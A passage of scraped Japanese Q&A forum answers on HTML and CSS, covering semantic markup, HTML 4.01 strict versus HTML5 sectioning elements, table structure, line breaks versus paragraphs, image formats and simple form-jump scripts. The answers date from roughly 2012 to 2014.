20px; list-style-type: square; line-height:2em; } div.section ul.nav li{margin-left:320px;padding:0;} /* ヘッダー(header)中のnav(igation)は */ div.header ul.nav{ list-style:none;margin:0;padding:0; font-size:0.8em;text-align:center; } div.header ul.nav li{ display:inline-block; padding:0 2em; } /* こんなこともできる */ div.section ul.nav{position:relative;} div.section ul.nav li:hover:after{position:absolute;font-size:1em;content:"▼";color:red;} div.section ul.nav li:hover:after{left:20px;top:20px;} div.section ul.nav li+li:hover:after{left:60px;top:100px;} div.section ul.nav li+li+li:hover:after{left:120px;top:200px;} div.section ul.nav li+li+li+li:hover:after{left:220px;top:300px;} div.section ul.nav li+li+li+li+li:hover:after{left:100px;top:300px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿＿<ul class="nav"><!-- 複数個所出てくるのでclass --> ＿＿＿<li>あああああああ</li> ＿＿＿<li>いいいいいいい</li> ＿＿＿<li>ううううううう</li> ＿＿＿<li>えええええええ</li> ＿＿＿<li>おおおおおおお</li> ＿＿</ul> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<ul class="nav"> ＿＿＿<li>あああああああ</li> ＿＿＿<li>いいいいいいい</li> ＿＿＿<li>ううううううう</li> ＿＿＿<li>えええええええ</li> ＿＿＿<li>おおおおおおお</li> ＿＿</ul> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
<!--[if lt IE 9]><![endif]--> じゃ無くて <!--[if lt IE]><![endif]--> そのまえに、HTML5として正しいか否かを 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) でチェック
(チェック)　<link rel=“stylesheet” href=“style3.css”> ○　<link rel="stylesheet" href="style3.css">
確実にやりたいならサーバー側のプログラムで エージェントを判断して設定を振り分けることになります なんとなくでよければjavascriptなどで環境にあわせて cssを変更する処理がよいかと
＞私のサイトを見て、ググった時に表示するかどうかをチェックしに来てるのです か？ その通りです。 ご自身でGoogleのサイト登録を行った場合であっても、クローラ（Googleボット）が来て初めてキャッシュされ、インデックス登録がなされます。 また、キャッシュされた後も定期的にクロールは行われます。 逆にボットが来ないと、質問者様のサイトが更新されても、Google側のキャッシュはいつまでも古いままとなり、検索の精度が下がってしまいます。
他に言いたいことは山ほどありますが、とりあえずご質問の件について。 スタイルシートのコメントにある指示に従え。
>>二、三万なら購入します。 これくらいで購入する方法は無いのですかね？ ヤフオクのＭａｃの落札履歴をみると、古いモデルなら、そのくらいで入手できるようです。
IEがネックになりますね IEを無視する場合は、こんな感じ <style> ul.access{list-style:none;} ul.access li{float:left;width:100px;text-align:center;border:1px solid #000000; border-left:0px solid;} ul.access li:first-child{border-left:1px solid;} </style> <ul class="access"> <li>aaa</li> <li>bbb</li> <li>ccc</li> <li>ddd</li> </ul> これにIE対策をして <style> ul.access{list-style:none;} ul.access li{float:left;width:100px;text-align:center;border:1px solid #000000; border-left:0px solid; behavior:expression( this.className+=this.previousSibling?"":(this.className?" ":"")+"firstchild" ); } ul.access li:first-child,ul.access li.firstchild{border-left:1px solid;} </style> <ul class="access"> <li>aaa</li> <li>bbb</li> <li>ccc</li> <li>ddd</li> </ul>
私は基本EmEditorで・・ 　⇒ブログテンプレート作り　CSSで困ったことが・・・ - ホームページ作成ソフト - 教えて！goo( http://oshiete.goo.ne.jp/qa/8455241.html ) 　の回答のようにHTML書きます。ブロック要素こどにタブひとつ・・短い<p></p>のように一目で見渡せる物は一行 　　　<p>ここは短い</p> 　　　<p> 　　　　ここ長い・・<span>行内要素</span>・・・ 　　　</p> とか統一しています。 　それが、書き変わる事はありません。
HTMLにしろCSSにしろ、最初は仕様書に目を通してから始めると良いです。 　⇒4.1.7 規則集合、宣言ブロック、セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/syndata.html#rule-sets ) 　宣言ブロックは、左波括弧（{）で始まり、対応する右波括弧（}）で終わる。宣言の間には、ゼロ個以上のセミコロン（;）で区切られたリストが存在しなければならない。 　⇒4.1.8 宣言とプロパティ( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/syndata.html#declaration ) 　宣言は、空であるか、もしくはプロパティ名の後にコロン（:）続くでプロパティ値で構成される。これらの前後に空白が出現してよい。 宣言を続けるときは必ず;セミコロンで区切ること!!
すでに回答しましたが・・それでIE7以降は改善されるはずですけど・・ 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) ・DOCTYPE宣言がない!!　これが最初に忠告されるはず・・ ★ちゃんとDOCTYPE宣言をしましょう。 　そのときに、必ずstrictにして置きます。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )』 　IEは、かって他のブラウザを蹴落とすために独自仕様でした(そのためIE用に作られたページ以外は崩れる) 　古いIE用を表示させる互換モー時を持っているた、IEに対して標準モードで動作させるように宣言する必要がある。 　対症療法な対処ではなく、きちんと対処しないとブラウザ間の誤差に随所で悩まされる ★body直下にtableはありえません。 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 　tableは二次元データをあらわすもので、配置やデザインのためではありません。 ※これは、最低限守らないと!!! [サンプル] ★HTML4.01strict + CSS2.1 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- table[summary="サンプル"]{ width: 90%; margin: 0 auto; background-color:red; border:solid 10px blue; border-radius:15px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table summary="サンプル"> ＿＿＿<tr> ＿＿＿＿<td>セル</td> ＿＿＿</tr> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
同じIDは同じHTMLの中で1つしかつけちゃいけないけど 同じNAMEは複数のタグにつけることができるの なので２つは意味が違ってくるのよ
HTML5ではなく、CSS3・・・スタイルシートです。ただしウェブ標準とは違う。 スライドショー自体はjQuery使用してます。 CSS3のアニメーションは 　⇒CSS Animations( http://www.w3.org/TR/css3-animations/ ) 時間的変化は 　⇒CSS Transitions( http://www.w3.org/TR/css3-transitions/ )
テキストボックス入力後にEnterを押すと、新しいタブ(またはウィンドウ)でサイト1を開くようにしました。 <html> <head> <script type="text/javascript"> <!-- function jump1(){ window.open("http://minkabu.jp/stock/" + document.getElementsByName("code1")[0].value,"_blank"); } function jump2(){ window.open("http://kabu-sokuhou.com/brand/item/code___" + document.getElementsByName("code2")[0].value,"_blank"); } //--> </script> <base target="main"> </head> <body> <form onsubmit="jump1();return false;"> <input name="code1" size="4"> <br><br> <input type="submit" value="サイト１へ"> </form> <form> <input type="hidden" name="code2" size="4"> <input type="button" onclick="jump2()" value="サイト２へ"> </form> </body> </html>
エラーですから、勿論良いわけはありません。EHINBHQBMJQNTさんの確認ブラウザでは、改行の数だけ空間が空いているのでしょうが、ぶらうざによっては、改行１回分と同じと解釈するブラウザもあります。エラーとはその処理がブラウザによってまちまちとなります。 連続<br>はたくさん改行したいのではなく、改行は１回でいいが、見た目で間隔を開けたいのではないですか？ それならもはや改行ではなく、段落が違うので、<br>ではな<p>で別の段落（要素）になるのではないかと。 <p>あああああああああ</p> <p>いいいいいいいいいいい</p> それでもっともっと、見た目を離したいという場合には、cssを使います。推奨は別ファイルにするｃｓｓですが、今回はすぐに試せる、インラインスタイルシートで記述します。 <p>あああああああああ</p> <p style="margin-top:10em;">いいいいいいいいいいい</p> style="～"インラインスタイルシートと解釈します。 中身は「プロパティ（何を）:値（どうする）」で、;を挟むことにより、複数記述できます。 今回は、上部の他の要素との空間を１０文字分空ける。という意味になります。 <p>あああああああああ</p> <p style="padding-top:10em;">いいいいいいいいいいい</p> でも今回の話しだと、いいと思います。 pでなく、他の要素でも同じです。 <div style="padding-top:10em;">いいいいいいいいいいい</div> という感じです。
日本語で構いません。 ただ、属性セレクタで日本語を使うとブラウザによってうまく行かない恐れが・・ table[summary="テスト"]{border:solid 2px red;} としたときに、文字コードと不整合だった場合ブラウザが理解できない。 そこさえ間違わなければ、構いません。 　⇒summary = text [CS] ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#adef-summary )
まず拡張子はただの名前なので、「拡張子を変える」のは無意味です。 画像形式を変えることを言っているのでしょうけれど。 また、今あるjpgファイルをそのままpngに変換するのは、画質が変わらずファイルサイズが増えるので、悪影響しかありません。 あくまで新たに作るファイルをjpgにするかpngにするかという観点で答えます。 pngの(jpgに対する)利点としては、無劣化であることが一番大きいと思います。 特に、線画や文字はjpgでは劣化が激しいのでpngがお勧めです。 逆にjpgの利点は、どんな画像でもそれなりのファイルサイズに収まることです。 pngはファイルサイズの幅が広く、単純な線画や文字だけのファイルならjpgより軽いですが、例えばデジカメで撮った写真をpngに変換すると恐ろしいファイルサイズになります。 なおNo1さんのサイトの内容はまあ大体合っていますが、pngが古いブラウザで使えないという点だけは、10年くらい前の話なので現在全く気にすることはありません。
自分でルールを決めておきましょう。 私は、ブロック要素はタブ・・ <body> - - <div class="header"> - - - - <h1>タイトル</h1> - - - - <div class="abstract"> - - - - - - <h2>抄録</h2> - - - - - - <p> - - - - - - - - このページでは、・・・・ - - - - - - </p> - - - - - - <p> - - - - - - - - このページでは、・・・・ - - - - - - </p> - - - -</div> - - </div> - - <div class="section"> - - - - <h2>本文</h2> - - - - - - <p> - - - - - - - - このページでは、・・・・ - - - - - - </p> 連続したタブや改行、半角スペースは「ユーザエージェントは、語間スペースの出力処理に際しては、連続する空白類の入力があった場合は1つにまとめてしまう必要がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/text.html#h-9.1 )」から、ソースが見やすいように改行、タブ、半角スペースでインデントさせると良いでしょう。 ※きちんと開始タグでインデント、閉じタグでインデント解除 ※むやみやたらと<DIV>を使わない。使うときは 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』 　なのですから、今何処にいるかもわかるはず ※よいテキストエディタを使用する。 　私のEmEditorだと、添付のように何処までがその開始タグかわかる。 ★基本は、タグごとにインデントさせること ★むやみにDIVなど使わないこと。 　
<html> <head> <script type="text/javascript"> <!-- function jump(){ location.href="http://minkabu.jp/stock/" + document.getElementsByName("code")[0].value; } //--> </script> </head> <body> <form> <input type="text" name="code"> <input type="button" onclick="jump()" value="移動する"> </form> </body> </html>
その指定は、その記述があるファイル自体についてのものです。 サーバーは無関係です。 UTF-8で保存したHTMLで、charset=EUC-JP だったら、文字化けするでしょう。
こちらを読んでおかれると良いでしょう。 簡単に説明できる内容じゃないので・・・ 　⇒Standard Generalized Markup Language - Wikipedia ( http://ja.wikipedia.org/wiki/SGML ) 　⇒マークアップ言語 - Wikipedia ( http://ja.wikipedia.org/wiki/%E3%83%9E%E3%83%BC%E3%82%AF%E3%82%A2%E3%83%83%E3%83%97%E8%A8%80%E8%AA%9E )
そのファイルから正しい相対位置を書いていますか？
とりあえずは、 <p class="partition">&nbsp;</p> を <div class="comment"> <p> 好きなことを書く </p> </div> とでもして・・・ サイズなどはスタイルシートでお好きに・・・
HTML5は膨大で習得は大変でしょう。 　私は、長いので結果的にはHTML2→HTML3.2→HTML4.01→HTML5と学んできましたから、ある意味・・とっても楽でした。 HTML2 ・・・ それまでの物をまとめて企画化した HTML3.2 ・・・・ インタラクティブなものやプレゼンテーションに関わる物が 　　　　　　　いくつか取り入れられた 　しかし、「どのような環境からも」というHTMLの大きな目的が失われた反省から HTML4.01が定められた。 　「HTMLは、常に構造的マーク付けを規定するところのSGMLをルーツに持っている。HTMLの性質上、プレゼンテーションに関する要素や属性は、次々と他の機構、とりわけスタイルシートに置換えられていく。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」 　HTMLはHTML4.01が最後の規格で、今後はXHTMLに移行するはずでした。しかし、XHTMLは厳密すぎる、任意の要素を追加できるなど難しいため・・W3Cと異なる組織でHTML5が準備されはじめた。XHTMLの普及も進まない中、W3Cも方針転換してHTML5を策定することに。XHTML2は中断。 　よって、今学ばれるならHTML5を見据えて、HTML4.01・・・そして必ずstrictで学ばれるのが良いでしょう。 「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )」 　⇒7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#version-info ) 　その際に、HTML4.01の仕様書にも書かれているのですが、特に「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」に留意すると良いでしょう。すなわち、class名にHTML5の「文書をよりよく構造化するために、追加された新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )」を使用し、それ以外は極力DIVを使わない。 [例] <body> 　<div class="header"> 　　<div class="nav"> 　　</div> 　</div> 　<div class="section"> 　　<div class="section"> 　　</div> 　　<div class="aside"> 　　</div> 　</div> 　<div class="footer"> 　</div> </body> のようなマークアップをしておけばHTML5に移行する時に <body> 　<header> 　　<nav> 　　</nav> 　</header> 　<section> 　　<section> 　　</section> 　　<aside> 　　</aside> 　</section> 　<footer> 　</footer> </body> と書き換えるだけですから・・ 基本的に 　⇒HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#toc ) を補習すればHTML5が分かる。 　まず 　⇒HTML 4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html ) をみにつけてから、HTML5に以降--行こう 　HTML5をいきなりより断然楽です。
>申し訳ないのですが、素人でしてどこで何をやればいいかもう少し具代的に教えていただきたいです。 どのくらいのスキルであるかは存じませんが、ここの解答欄で回答できる内容を越えています。 また、開発している人で無いとしたら、ここで具体例を出しても実装できない気がします。 たとえば、サーバ側でフレームワークを利用していれば書き方が違ってきます。 具体的な回答をするには以下の補足が必要です。 ・使用フレームワーク(おそらくstruts系？) ・サーバ側のjspを呼び出しているアクションクラス等 ・表示しているjsp ようは、それが動作している一式が無いと具体的な回答は難しいです。
<style type="text/css"> } 最初の「　｝　」が邪魔してます。 それから、htmlでは、divが閉じられていません。 ケアレスミスに注意しましょう。 タグ補完してくれるようなお助けツールをしよすると、ミスが減るような気がします。
申し上げにくいですが、その参考ページはお勧めできません。例えていうと、火打ち石での火の付け方を　マッチやライター等知らされずに勉強するような……。時代錯誤ですので、学ばれるなら今の勉強をしませんか？今は、htmlは文章構造を、cssでデザインの役割分担がなされるページが主流となっています。さらに動きをつけるならJavaScript等。 tableは文章構造ですが、色を付けたいなどは、文章構造ではありません。デザインの方です。なにもかも、htmlでやるには、手間がかかるばかりで、いいことない気がします。 それにそのページにも書いてありますが、ＩＥ専用ですよ。しかもＩＥ９でも動作しない。今は１０、そして１１に移行の時代に学ぶ価値無しの気がします。 余談はさておき、提示された条件のみでしたら、<head>の中に <style type="text/css"> table td {border:1px solid #00ffff;} </style> といれれば、何とかなると思います。 </head>のすぐ上などに入れてみてください。条件によっては、無理かもしれませんが、提示の条件だと行けると思います。
確かに、bgcolorだとかいろいろな設定はhtmlタグの中に書けます。 PCのエディタで作り、IEなどのブラウザで表示する、というだけであればCSSは余計なものに思うのは自然です。 ただし、こういうことになります。 箇条書きで10個ぐらいの記述があるとします。 <ul><li>をしたとして考えましょう。 １行目のメッセージのフォントカラーを青にしたいとします。その行の<li>に属性を与えればOK. ２行目は？　やっぱり前の行と同じように<li>にfont color=blueというようにやります。 これを１０行やる必要があります。１０行全部書く必要があります。 その中のひとつだけ注目を集めるためcolor=redにしたければ、たとえばそれが８行目なら８行目の<li>だけそうすればいい。 翌日、注目欄は８行目ではなく９行目になったとします。 修正場所は？　 ８行目はcolor=blue ９行目はcolor=red と直す必要がありますね。 １１行になる必要がでたら、１１行目にも青表示命令を書かなければなりません。 CSSを使うとどうなるか。 <li>というタグはfont color=blueとしておけば、本文が１０行であれ２０行であれいちいち書く必要はありません。 もしそのうちの１行だけ赤くしたければ、CSSでPICKUPというクラスのliを宣言し、color=redにします。 本文HTMLではclass="PICKUP"のように設定しておけばいいのです。 こういうことを、抽象化だとか部品化とかいろいろ呼ばれていますが、ミスなしにするテクニックです。 ある日、青文字を全部緑にしたいと思いついたら、CSSをgreenに書き換えるだけで、全ページはそれに従います。 ここまでが、CSSのふつうの働きです。 HTML5、CSS3になることでこの話は異常に展開します。 ひとつをお教えしますと、レスポンシブルページというものです。 同じページを、PC、タブレット、スマホ、ガラケーで見る可能性があると考えます。 昔なら、携帯用のサイトは/mだとかURLに別フォルダを作りましたがそんな必要はありません。 ブラウザの横幅のサイズがわかりますので、 　うんと短い場合（ガラケー） 　短い場合（スマホ縦置き） 　やや短い場合（スマホ横置き、またはタブレット） 　長い場合（PC) で、画像のサイズを調整したり折り返しをしたり、マウスを置いた時の動きを替えたり、これをCSSだけで行うのです。 HTMLを作るほうでは、一応CSSで何をするかによってidやクラスを想定する必要はありますが、１枚だけページを作れば問題ないのです。 こういうことを、問い合わせ元のブラウザの反応で切り分ける＝レスポンシブル、という操作名で実現します。
＞そんなこんな考えていたら意味のない装飾のためだけの画像を入れるのに向いているタグってないんじゃないかな？って思えてきました。 　わかってらっしゃる。 　HTMLは、文書構造だけ記述し、それをスタイルシートでプレゼンテーションする。これがウェブページの「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )」という大原則です。 　DIVはデザインのためではなく文書構造をマークアップするために用意されています。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』 　そして、HTML5では文書構造を示す要素が追加されたためDIVは、原則として使えなくなります。 「NOTE:Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( http://www.w3.org/TR/html5/grouping-content.html#the-div-element )」 　ページに3つの背景の異なるブロックがあるという事は、3つの異なる文書構造上のブロックがあるという事ですから HTML4.01でしたら <body> 　<div class="header"> 　　文書のヘッダ 　</div> 　<div class="section"> 　　本文 　</div> 　<div class="footer"> 　　文書のフッタ 　</div> </body> とマークアップされてきたはずです。 HTML5では、divを使わなくても、文書構造をあらわせますので <body> 　<header> 　　文書のヘッダ 　</header> 　<section> 　　本文 　</section> 　<footer> 　　文書のフッタ 　</footer> </body> とあらわせるので楽になります。もっと複雑な場合は <body> 　<header> 　　文書のヘッダ 　　<nav>ナビゲーション</nav> 　</header> 　<section> 　　本文 　　<section> 　　　階層ひとつ下 　　</section> 　　<section> 　　　階層ひとつ下 　　　<article> 　　　　<header></header> 　　　　<section></section> 　　　　<footer></footer> 　　　</article> 　　</section> 　　<aside> 　　　本文と関係ない記事 　　</aside> 　</section> 　<footer> 　　文書のフッタ 　</footer> </body> となります。 　HTML4.01の場合はclass名で!!。headerもsectionも何度も登場する可能性があるのでidじゃまずい。 　文字通り、背景だけでコンテンツがひとつしかなければ <html> 　<body> 　　<h1>見出し</h1> 　　<p>・・・</p> 　</body> </html> は最低限あるはずですから html,bodY{margin:0;padding:0;width:100%;height:100%;position:relative;} html{background:url(./images/background/underGreen.gif) repeat-x 0 top;padding-top:100px;} body{background:url(./images/background/gradiation.gif) 0 bottom repeat-x;padding-bottom:39px;} underGreen.gifは高さ10px; gradiation.gifは高さ39px; とか・・
<html> <body> <form action="http://stocks.finance.yahoo.co.jp/stocks/detail/" method="get"> <input type="text" name="code"> <input type="submit"> </form> </body> </html>
例えば 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 従来の Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) と異なり、ボタンでのチェックは出来ないようですね。
私も windows7 chrome 32.0.1700.76m で同じ現象が出ています。 バグですかね。 http://productforums.google.com/forum/#!topic/chrome-ja/I05Ixft9UF8
まぁ、今はメール以外そんなに気にしなくてもいいんですが、 半角と全角をちゃんと使い分けて書いた方がきれいだと思います。 で、記号には、英数記号とカナ記号があります。 英数記号は半角推奨で、カナ記号は全角推奨です。 「ー」(伸ばす棒)は、全角推奨です。 「?」は、半角推奨です。 どうやって区別するかというと、 IMEの入力モードを「半角英数」モード(またはIME OFF)に して普通にキーボードから入力できる記号は英数記号です。 IMEで変換しないと入力できない記号は、カナ記号です。 また、キーボードの各キーに文字が刻印されていると思いますが、 左または上に刻印されているものは英数文字または英数記号で、 下または右に刻印されているものはカナ文字またはカナ記号です。
こんなところで聞いたって正確で正しい情報は得られない。まず何よりも先に仕様書を調べること!! 　⇒表( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html ) 11.2.1 TABLE要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#edef-TABLE ) 　には、 <!ELEMENT TABLE - - (CAPTION?, (COL*|COLGROUP*), THEAD?, TFOOT?, TBODY+)> と書かれている。 　　(注)?は0個または1、*は0個以上、+はひとつ以上と言う意味、|は「又は」ですから 要素 TABLEは 　CAPTION?　　CAPTION は、存在しないか１つのみ 　(COL*|COLGROUP*)　COLかCOLGROUPを０個以上--なくても良いし、いくつあっても良い 　THEAD?　　　THEADは、存在しないか１つのみ 　TFOOT?　　　THEADは、存在しないか１つのみ 　TBODY+　　　TBODYは、【ひとつ以上】すなわち必須!! と書かれています。 　CAPTION,THEAD,TFOOTなどそれぞれの要素は、 11.2.2 表題: CAPTION要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#edef-TABLE ) 11.2.3 行グループ: THEAD、 TFOOT、及びTBODY要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.2.3 ) 　などに詳しく書かれています。 CAPTIONは、最初に書け!!、THEAD,TFOOTはTBODYより前・ すなわち、<table>に続いて、<tr>は書くことは出来ません。tdが置けるのは <!ELEMENT THEAD - O (TR)+ <!ELEMENT TFOOT - O (TR)+ <!ELEMENT TBODY - O (TR)+ ですから、正式に記述すると <table summary="この表の言葉での説明を書く" border="1"> 　<caption>今月の予定</caption> 　<thead> 　　<tr> 　　　<th abbr="Sun">日曜</th><th abbr="Chu">火曜</th>・・・<th abbr="Sat">土曜</th> 　　</tr> 　</thead> 　<tfoot> 　　<tr> 　　　<th abbr="Sun">日曜</th><th abbr="Chu">火曜</th>・・・<th abbr="Sat">土曜</th> 　　</tr> 　</foot> 　<tbody><!-- TBODY開始タグは、表が本体をただ1つだけ含んでいてヘッダもフッタも含まないという場合を除き、常に必要である。 --> 　　<tr> 　　　<td></td><td>1</td><td>2</td><td>3</td><td>4</td><td>5<td><td>6</td> 　　</tr> 　</tbody> </table> 最低限ですますなら <table summary="この表の言葉での説明を書く" border="1"> 　<tr> 　　<th abbr="Sun">日曜</th><th abbr="Chu">火曜</th>・・・<th abbr="Sat">土曜</th> 　</tr> 　<tr> 　　<td></td><td>1</td><td>2</td><td>3</td><td>4</td><td>5<td><td>6</td> 　</tr> </table> 　※ただひとつの本体しか含まず、THEAD,TFOOTも含まないのでTBODYは省略できる。 になります。 summaryは、「表のsummary(要約)をユーザが得られるようにする。 著者は、非視覚系ユーザエージェントのユーザにも理解しやすいよう、表の内容と構造に関する要約を提供する必要がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#adef-summary )」 　HTML5では必須でなくなりました。 border="1"は、スタイルシートを理解しないブラウザのために、通常は書いておきます。 ＞これってダメな例なんですよね？ 　そのマークアップ自体は、summary属性がないことをのぞき特に誤りと言うわけではありませんが、デザインや配置のために、本来表でない物をtableでマークアップするのは、文法以前に誤りです。 ・単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.1 ) ・ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.1 )
いいえ。両方必要だから書いてあります。 前者は、文字コードの指定のため。 後者は、スタイルのタイプがcssであることを示すため。 まあ、書かなくても普通のブラウザなら適当に解釈して表示してくれると思いますが。
　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) などにURLを入れてチェックすると分かりますけど・・ ブラウザには関係しません。ブラウザは常に 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLユーザエージェント 　HTMLユーザエージェント【あるいは単にユーザエージェント】とは、HTML文書を解釈するプログラムのことを指す ・・・【中略】・・・ 　HTML 4仕様に適合するユーザエージェントとは、この仕様の必須事項と下記の3点とを遵守するもののことを指す。 ・・・【中略】・・・ 　過去との互換性のため、HTML 4 を解釈するツールについては、HTML 3.2 ([HTML32]参照)並びにHTML 2.0 ([RFC1866]参照)をもサポートすることを推奨する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/conform.html#h-4.1 )］より HTML5でも同様です。 　ただしHTML5では、明確に「著者が使ってはならない」けど「ユーザーエージェントは理解しなければならない」と区別されました。 http://momdo.s35.xrea.com/web-html-test/spec/WD-html51-20131029/obsolete.html#non-conforming-features
スタイルシート言語です。 (参考) http://ja.wikipedia.org/wiki/%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E3%82%B7%E3%83%BC%E3%83%88#.E3.82.B9.E3.82.BF.E3.82.A4.E3.83.AB.E3.82.B7.E3.83.BC.E3.83.88.E8.A8.80.E8.AA.9E
小学校の国語を思い出してください。 新しいテーマについて話題が始まるときには、段落を変えて一文字下げますよね。 <p>Paragraph</p>とはそれを意味するマークアップです。 　一方、br(forced line break)は、文字通り、ひとつの段落でありながらの強制改行ですから、原則として一般的な文書には現れないはずです。 ★難しく言うと、改行自体がその記事の内容であるときがbrと言う事です。 　(例)住所で広域の部分と詳細部分を区切る 　　　詩において、行を変えることも内容であるとき 　段落<p></p>は、スクリーンリーダーだと、その前後にすこし間をとってくれるでしょうが、<br>だと「改行」と読む可能性があります。 　よく初心者が書いているページに、行間をつめるときは,br、間を開けるときはpなんて書いてあるのを見かけます。文字を大きくしたければh1とか・・・。これらは明白な誤りです。行間や段落間の調整はスタイルシートで行えばすみます。 p{margin:0;line-height:1.6em;text-indent:1em;}
いいえ、HTMLの仕様書の最初のほうに 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。 なぜならただ1種類の文書しか作る必要がなくなるからだ。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣※ 　もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 　どのバージョンのHTMLも、コンテンツプロバイダの投資が無駄にならないよう、また短期間で文書が読み取り不能となったりすることがないよう、産業界の幅広い賛同を反映するようにされてきた。 （いちいち新しい端末が登場するたびに別の物を作る事はしたくないと言うこと） 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より ※アンダーラインや（）は私が補足 　HTMLを使ってウェブページを作成するのは、そのためです。 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ ・文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 ) 　と随所に指摘されている。 ＞ホームページを作る際に携帯に対応させる場合は携帯用のコードを作らないとダメなのでしょうか？ 　ウェブページ(ホームページじゃない)を作成するときに、HTMLを使うことで、たった一つの文書さえ作ればよくなるのです。
